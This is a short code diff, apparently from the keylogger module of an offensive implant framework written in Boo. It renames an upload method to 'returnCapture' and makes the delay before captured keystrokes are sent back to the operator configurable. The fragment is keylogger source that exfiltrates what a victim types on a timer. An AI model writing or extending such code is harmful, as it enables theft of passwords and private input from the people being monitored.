@@ -28,7 +28,7 @@ public class InterceptKeys(Form):
         Main()
 
     
-    public static def upload():
+    public static def returnCapture():
         _job.SendJobResults(results);
 
     public static def Main():
@@ -42,8 +42,8 @@ public class InterceptKeys(Form):
         
         STAThread as Thread = Thread() do:
             Thread.CurrentThread.IsBackground = true
-            Thread.Sleep((TimeSpan.FromMinutes(1).TotalMilliseconds cast int))
-            upload()
+            Thread.Sleep((TimeSpan.FromMinutes(MINUTES).TotalMilliseconds cast int))
+            returnCapture()
 
         STAThread.SetApartmentState(ApartmentState.STA)
         STAThread.Start()
